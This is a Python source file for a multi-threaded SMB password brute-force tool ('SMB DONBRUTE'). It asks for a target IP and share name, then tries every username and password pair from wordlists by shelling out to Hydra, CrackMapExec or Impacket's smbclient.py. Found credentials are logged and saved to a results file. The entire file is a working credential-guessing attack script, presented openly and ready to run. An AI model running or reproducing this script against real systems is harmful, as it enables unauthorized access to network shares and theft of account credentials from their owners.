import os
import subprocess
import threading
from queue import Queue
import logging

# === ASCII BANNER ===
ascii_banner = r"""
 ██████  ██████  ███    ██ ██████  ██████  ██    ██ ████████ ████████ ███████ 
██      ██    ██ ████   ██ ██   ██ ██   ██ ██    ██    ██       ██    ██      
██      ██    ██ ██ ██  ██ ██   ██ ██   ██ ██    ██    ██       ██    █████   
██      ██    ██ ██  ██ ██ ██   ██ ██   ██ ██    ██    ██       ██    ██      
 ██████  ██████  ██   ████ ██████  ██████   ██████     ██       ██    ███████ 
                        SMB DONBRUTE - Optimized Brute Force Tool              
"""
print(ascii_banner)

# === CONFIGURATIONS ===
def get_input(prompt, valid_choices=None):
    while True:
        choice = input(prompt).strip()
        if valid_choices and choice not in valid_choices:
            logging.error("Invalid choice! Please try again.")
        else:
            return choice

TARGET_IP = get_input("Enter the target IP: ")
SHARE_NAME = get_input("Enter the SMB share name: ")

# === USERLIST SELECTION ===
userlist_choice = get_input("Press 1 for the built-in userlist or 2 to provide the path to your userlist: ", ['1', '2'])
USERLIST_PATH = os.path.join(os.getcwd(), 'userlist.txt') if userlist_choice == '1' else get_input("Enter the path to the username list: ")

# Tool selection with keys
tool_choice = get_input("Press 'h' for Hydra, 'c' for CrackMapExec, 'i' for Impacket, or 'a' for all: ", ['h', 'c', 'i', 'a'])
TOOL = {'h': 'hydra', 'c': 'crackmapexec', 'i': 'impacket', 'a': 'all'}[tool_choice]

THREAD_COUNT = 10  # Adjust for more speed

# === WORDLIST SELECTION ===
wordlist_choice = get_input("Press 1 for the built-in wordlist or 2 to provide the path to your wordlist: ", ['1', '2'])
WORDLIST_PATH = os.path.join(os.getcwd(), 'wordlist.txt') if wordlist_choice == '1' else get_input("Enter the path to the password list: ")

# === SETUP LOGGING ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# === CHECK FILES EXIST ===
if not os.path.exists(USERLIST_PATH) or not os.path.exists(WORDLIST_PATH):
    logging.error("Userlist or wordlist file not found!")
    exit(1)

# === CHECK IF TOOL IS INSTALLED ===
def is_tool_installed(tool_name):
    return subprocess.run(["which", tool_name], capture_output=True, text=True).stdout.strip() != ""

def get_tool_version(tool_name):
    try:
        result = subprocess.run([tool_name, "--version"], capture_output=True, text=True)
        if result.returncode == 0:
            logging.info(f"{tool_name} version: {result.stdout.strip()}")
    except Exception as e:
        logging.error(f"Error getting {tool_name} version: {e}")

if TOOL != "all" and not is_tool_installed(TOOL):
    logging.error(f"{TOOL} is not installed! Install it first.")
    exit(1)

if TOOL == "all":
    for tool in ['hydra', 'crackmapexec', 'impacket']:
        if is_tool_installed(tool):
            get_tool_version(tool)
else:
    get_tool_version(TOOL)

# === MULTI-THREADED ATTEMPT ===
found = threading.Event()  # Flag to stop other threads when successful

def brute_force(username, password):
    if found.is_set():
        return  # Stop if another thread found the password

    if TOOL == "hydra":
        command = ["hydra", "-l", username, "-p", password, f"smb://{TARGET_IP}", "-V"]
    elif TOOL == "crackmapexec":
        command = ["crackmapexec", "smb", TARGET_IP, "-u", username, "-p", password]
    elif TOOL == "impacket":
        command = ["smbclient.py", f"//{TARGET_IP}/{SHARE_NAME}", "-U", f"{username}%{password}"]

    try:
        result = subprocess.run(command, capture_output=True, text=True)
    except subprocess.SubprocessError as e:
        logging.error(f"Subprocess error: {e}")
        return

    # === SUCCESS DETECTION ===
    output = result.stdout.lower()
    if any(keyword in output for keyword in ["valid", "success", "pwned", "session established"]):
        logging.info(f"Found Credentials: {username}:{password}")
        with open("smb_brute_results.txt", "a") as f:
            f.write(f"{username}:{password}\n")
        found.set()  # Stop other threads
        return

# === MULTI-THREADING ===
queue = Queue()

# Load users & passwords into the queue
try:
    with open(USERLIST_PATH, "r") as users:
        user_list = [user.strip() for user in users]
except IOError as e:
    logging.error(f"Error reading userlist file: {e}")
    exit(1)

try:
    with open(WORDLIST_PATH, "r", encoding="utf-8") as wordlist:
        password_list = [password.strip() for password in wordlist]
except UnicodeDecodeError:
    logging.warning(f"Error decoding {WORDLIST_PATH} with UTF-8, trying ISO-8859-1.")
    try:
        with open(WORDLIST_PATH, "r", encoding="ISO-8859-1") as wordlist:
            password_list = [password.strip() for password in wordlist]
    except Exception as e:
        logging.error(f"Error reading wordlist file with fallback encoding: {e}")
        exit(1)
except IOError as e:
    logging.error(f"Error reading wordlist file: {e}")
    exit(1)

for user in user_list:
    for password in password_list:
        queue.put((user, password))

def worker():
    while not queue.empty() and not found.is_set():
        username, password = queue.get()
        logging.info(f"Trying {username}:{password}")
        brute_force(username, password)
        queue.task_done()

# Create multiple threads
threads = []
for _ in range(THREAD_COUNT):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()

logging.info("Brute-force attack completed!")
